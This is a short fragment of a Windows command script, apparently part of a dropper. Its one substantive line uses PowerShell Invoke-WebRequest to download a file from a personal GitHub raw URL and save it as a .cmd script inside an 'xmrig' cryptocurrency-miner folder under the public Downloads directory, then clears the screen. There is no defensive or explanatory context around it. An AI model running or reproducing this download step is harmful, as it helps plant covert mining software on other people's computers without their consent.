...
powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/learn.sh" -OutFile "C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd"
cls
